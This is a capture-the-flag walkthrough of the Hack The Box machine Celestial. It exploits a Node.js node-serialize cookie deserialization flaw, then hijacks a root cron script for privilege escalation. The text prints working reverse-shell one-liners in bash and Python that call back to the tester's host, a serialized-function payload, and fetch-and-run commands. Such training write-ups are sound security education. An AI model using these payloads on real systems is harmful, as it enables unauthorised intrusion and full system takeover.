# Celestial [HTB](https://app.hackthebox.com/machines/130)
![celestial-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/celestial-01.png)

## Recon

After adding an entry for our target in `/etc/hosts`, i start enumerating with `namp`:

```bash
nmap -sC -sV -A -p- celestial.htb -oN nmap.result
``` 

![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/nmap-res-02.png)

We have a single `Node.js` web server running on port 3000, lets take a look at it.


### Node.js Express Port 3000

Lets start by openning the site at `http://celestial.htb:3000`

![site-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/site-03.png)

Ok, not much to see here, lets open `Burp` and take a closer look at what's happenning in the background:

![burp-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/burp-04.png)

When we make an initial request, Altough the server replied with a `200` OK HTTP status, it prints
out a `404` text header. Along with that, the server gives us a cookie. If we then refresh the page, 
our client requests the same root directory, but this time adds the cookie and now we get the page:

![cookie-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/cookie-05.png)


So the cookie is being used here for something. 

When I initially researched `Node.js` cookies, I found [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express)'s page, that describes a tool to decrypt the cookies. But then i nocited that the cookie format is different from whats been given to us be the target. So this tool will not help us. 

Then i took a closer look at the cookie itself, at first i thought it was encrypted with a strong 
encryption algorithm, but still I decided to check it againts [hash-identifier](https://hashes.com/en/tools/hash_identifier):

![base64-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/base64-06.png)

If we take our cookie and [decode](https://www.base64decode.org/) it we see the following:

![decode-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/decode-07.png)

So the cookie is just a base64 encoded JSON data. The `username` and `num` keys are interesting. 
I think they are used to render the text on the main page. Lets set the `num` argument to `4` encode it and send it to the target:

![num-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/encode-08.png)

Now lets send that to the server as the cookie and see what happens:

```bash
curl -H 'Cookie: profile= eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjQifQo=' http://celestial.htb:3000
```

![response-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/response-09.png)

We can see the response has changed. We can conclude from this that the server is using data extracted
from the cookie to render the web page. And since we can easily control what goes in the cookie, we can 
possibly temper with the server's backend. 

Now the question is, how we can levrage this to get access to the system? 

So i started to play around with different payloads, like `"num": "id"`. Which lead me to an interesting error:

![eval-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/evaul-10.png)

The `eval()` function in JavaScript evaluates and executes java code, this is a potential attack vector. 
So i tried to to send a reverse shell with the different payloads. None worked for me, but the following one brought yet another interesting error:

```java
"num":"exec(\"/bin/bash -c 'exec 5<>/dev/tcp/10.10.14.61/443;cat <&5 | while read line; do $line 2>&5 >&5; done'\");"
```

![unserialize-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/unserialize-11.png)


While googeling this error, i came across an interesting [artical](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/). Apperantly, in some 
versions of the `node-sirialize` module, we can execute arbitrary code by declaring a serialized functionpassed inside a cookie and immediatly invoke it with a function expression. 

I've tried to find a working payload for quite some time, I tried a few different exploits from `ExploitDB`, but they did not work for me. So i decided to use [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) script to generate a JavaScript reverse shell payload.

After downloading the script, i generated my payload with:

```bash
./nodejsshell.py 10.10.14.61 443
```

![gen-payload-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/gen-payload-12.png)

This results in a rather large output. I took the `<nums>` output and wrapped it inside a serliazed function and i invoked it at the end with `()`:

```javascript
"_$$ND_FUNC$$_function (){eval(String.fromCharCode(<nums>))}()"
```

I took the payload and placed it as the value for the `num` property in the cookie and base64 encoded it:

![encode-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/encode-13.png)


I started my listener with:

```bash
rlwrap nc -lnvp 443
```

And i sent the payload to the target:

![send-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/send-14.png)

This gave me access to the system:

![shell-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/shell-15.png)


## Privilege Escalation

The first thing i did after landing the shell was to upgrade it with:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![upgrade-shell-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/upgrade-shell-16.png)

Now it's a bit more intuitive. Then i tried to snatch quick wins by running `history`, `sudo -l`, as well
as `find / -perm -4000 2>/dev/null` but with no luck. 

If we take a look at our user's group membership with `id` we can see that our user is a part of the `sudo` and `adm` groups, but in order to use `sudo` we need our user's password which i wasnt able to find. 

So intead i decided to have a look around the system, if we list out the contents of our home folder we 
will se somthing interesting:

![home-dir-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/home-folder-17.png)

We have a text file in our home folder owned by root, this is unusual. I'm thinking that a task is 
probably running in the background doing this. Lets get [pspy64](https://github.com/DominicBreuker/pspy)
on the target and take a look at the background processes. 

Use a python server to host the file with:

```bash
python3 -m http.server 80
```

Download the file from the target and execute it using:

```bash
wget http://10.10.14.61/pspy64
chmod +x pspy64 
./pspy64
```
![task-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/task-18.png)

Here it is. We have root (UID 0), spwaining `bin/sh` to run a python script found in our user's `~/Documents` directory. The output from the script is saved to the `output.txt` file we saw erlier. 

If pay close attention to the task, we can see a few different commands here are being executed, 
but we only really care about the first one, if we can inject code into this file we can pop a reverse 
shell as root. Everything after the first command will be halted due to the reverse shell connection.

What i ended up doing, is creating a pyhton reverse shell script in my Kali machine:

```python
import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",9001));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
```

Then, i deleted the orignal `script.py` on the the target and downloaded my version with:

```bash
rm script.py 
wget http://10.10.14.61/script.py
```

Then i started my listener with:

```bash
rlwrap nc -lnvp 9001
```

And waited for the connection:

![root-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/root-19.png)


